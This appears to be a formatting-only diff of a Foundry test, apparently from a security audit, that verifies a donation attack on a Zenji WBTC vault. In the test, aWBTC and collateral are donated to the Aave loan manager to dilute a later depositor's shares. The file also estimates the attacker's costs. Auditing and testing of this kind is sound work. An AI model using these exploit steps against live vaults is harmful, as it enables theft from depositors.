@@ -5,7 +5,9 @@ import { Test, console } from "forge-std/Test.sol";
 import { Zenji } from "../src/Zenji.sol";
 import { ZenjiViewHelper } from "../src/ZenjiViewHelper.sol";
 import { AaveLoanManager } from "../src/lenders/AaveLoanManager.sol";
-import { UniversalRouterV3SingleHopSwapper } from "../src/swappers/base/UniversalRouterV3SingleHopSwapper.sol";
+import {
+    UniversalRouterV3SingleHopSwapper
+} from "../src/swappers/base/UniversalRouterV3SingleHopSwapper.sol";
 import { UsdtIporStrategy } from "../src/strategies/vault/UsdtIporStrategy.sol";
 import { IERC20 } from "../src/interfaces/IERC20.sol";
 import { IChainlinkOracle } from "../src/interfaces/IChainlinkOracle.sol";
@@ -110,7 +112,14 @@ contract VerifyH40 is Test {
         address expectedVaultAddress = computeCreateAddress(address(this), startNonce + 3);
 
         swapper = new UniversalRouterV3SingleHopSwapper(
-            owner, WBTC, USDT, UNIVERSAL_ROUTER, WBTC_USDT_V3_FEE, BTC_USD_ORACLE, USDT_USD_ORACLE, 3_600
+            owner,
+            WBTC,
+            USDT,
+            UNIVERSAL_ROUTER,
+            WBTC_USDT_V3_FEE,
+            BTC_USD_ORACLE,
+            USDT_USD_ORACLE,
+            3_600
         );
 
         UsdtIporStrategy strategy = new UsdtIporStrategy(
@@ -173,7 +182,8 @@ contract VerifyH40 is Test {
         // Step 1: Initial deposit to establish baseline
         vm.startPrank(user1);
         wbtc.approve(address(vault), type(uint256).max);
-        try vault.deposit(5e8, user1) {} catch {
+        try vault.deposit(5e8, user1) { }
+        catch {
             vm.stopPrank();
             console.log("=== AAVE POOL EXHAUSTED ===");
             console.log("Aave USDT borrow failed - pool utilisation at 100%%.");
@@ -205,7 +215,7 @@ contract VerifyH40 is Test {
         // Step 3: Execute dual donation attack
         // 3a: Donate aWBTC to AaveLoanManager
         //     (In production: attacker supplies WBTC to Aave, gets aWBTC, transfers to LM)
-        uint256 aTokenDonation = 1e7;    // 0.1 WBTC in aTokens
+        uint256 aTokenDonation = 1e7; // 0.1 WBTC in aTokens
         uint256 collateralDonation = 1e7; // 0.1 WBTC in raw collateral
 
         uint256 lmATokenBefore = aWbtc.balanceOf(address(loanManager));
@@ -264,8 +274,8 @@ contract VerifyH40 is Test {
             "FAIL_B: share dilution not observed - new depositor got same or more shares"
         );
 
-        uint256 dilutionBps = ((sharesWithoutAttack - sharesAfterAttack) * 10000)
-            / sharesWithoutAttack;
+        uint256 dilutionBps =
+            ((sharesWithoutAttack - sharesAfterAttack) * 10000) / sharesWithoutAttack;
         console.log("Dilution (bps)         :", dilutionBps);
 
         // ASSERTION C: Dilution is nonzero
@@ -310,9 +320,8 @@ contract VerifyH40 is Test {
         vm.stopPrank();
         vm.roll(block.number + 1);
 
-        uint256 shareDeficit = sharesWithoutAttack > user2SharesActual
-            ? sharesWithoutAttack - user2SharesActual
-            : 0;
+        uint256 shareDeficit =
+            sharesWithoutAttack > user2SharesActual ? sharesWithoutAttack - user2SharesActual : 0;
 
         console.log("\n=== Victim Deposit Confirmation ===");
         console.log("user2 shares received  :", user2SharesActual);
@@ -329,8 +338,8 @@ contract VerifyH40 is Test {
 
         // Step 8: Economic analysis
         uint256 attackerCost = actualATokenDonation + collateralDonation;
-        uint256 offsetAsFractionBps = (VIRTUAL_OFFSET * 10000)
-            / (totalAssetsBefore + VIRTUAL_OFFSET);
+        uint256 offsetAsFractionBps =
+            (VIRTUAL_OFFSET * 10000) / (totalAssetsBefore + VIRTUAL_OFFSET);
 
         console.log("\n=== Attack Economics ===");
         console.log("Attacker cost (satoshis):", attackerCost);
@@ -354,7 +363,8 @@ contract VerifyH40 is Test {
     function test_H40_controlBaseline() public {
         vm.startPrank(user1);
         wbtc.approve(address(vault), type(uint256).max);
-        try vault.deposit(5e8, user1) {} catch {
+        try vault.deposit(5e8, user1) { }
+        catch {
             vm.stopPrank();
             console.log("=== AAVE POOL EXHAUSTED ===");
             console.log("Aave USDT borrow failed - pool utilisation at 100%%.");
@@ -387,10 +397,7 @@ contract VerifyH40 is Test {
         console.log("actualShares  :", user2Shares);
 
         assertApproxEqRel(
-            user2Shares,
-            expectedShares,
-            1e16,
-            "Control: share calculation deviated more than 1%"
+            user2Shares, expectedShares, 1e16, "Control: share calculation deviated more than 1%"
         );
         console.log("CONTROL PASSED: shares proportional without attack");
     }
